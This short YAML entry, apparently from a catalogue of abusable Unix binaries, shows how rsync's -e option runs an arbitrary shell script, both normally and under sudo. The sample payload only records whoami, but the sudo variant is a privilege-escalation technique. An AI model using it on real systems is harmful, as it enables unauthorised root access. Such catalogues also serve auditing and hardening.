---
functions:
  execute-non-interactive:
    - code: echo "whoami > /tmp/whoami" > /tmp/tmpfile
            rsync  -e 'sh /tmp/tmpfile' /dev/null 127.0.0.1:/dev/null 2>/dev/null
  sudo-enabled:
    - code: echo "whoami > /tmp/whoami" > /tmp/tmpfile
            sudo rsync  -e 'sh /tmp/tmpfile' /dev/null 127.0.0.1:/dev/null 2>/dev/null
---
